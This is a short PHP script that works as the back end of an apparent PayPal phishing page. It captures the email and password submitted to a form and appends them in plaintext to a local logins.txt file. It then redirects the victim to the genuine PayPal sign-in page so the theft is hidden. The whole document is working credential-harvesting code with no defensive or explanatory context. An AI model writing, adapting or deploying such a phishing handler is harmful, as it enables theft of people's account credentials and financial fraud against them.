<?php
// Verified if the form worked
if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    // Recive form data
    $email = $_POST['email'];
    $password = $_POST['password'];

    // Create content to save
    $data = "email: $email\n";
    $data .= "password: $password\n";
    $data .= "------------------------\n";

    // Save data in txt file
    $dir = 'C:/Users/...';
    $file = $dir . '/logins.txt';

    if (!file_exists($dir)) {
        echo 'Error: Directory doesnt exists.';
    } else {
        // Add data to the file
        if (file_put_contents($file, $data, FILE_APPEND | LOCK_EX)) {
            // After data is saved, redirect to the paypal web
            header('Location: https://www.paypal.com/signin');
            exit();
        } else {
            echo 'There was an error saving the data.';
        }
    }
}
?>